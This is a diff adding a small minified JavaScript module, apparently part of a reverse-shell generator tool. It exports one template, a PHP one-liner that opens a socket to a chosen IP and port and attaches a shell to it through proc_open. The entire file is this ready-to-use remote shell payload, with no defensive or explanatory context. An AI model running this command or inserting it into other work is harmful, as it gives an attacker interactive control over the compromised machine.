@@ -1,0 +1,1 @@
+const e=[{title:"PHP Proc_open Reverse Shell",template:`php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`,description:"PHP one-liner reverse shell using proc_open function."}],o={commands:e};export{e as commands,o as default};
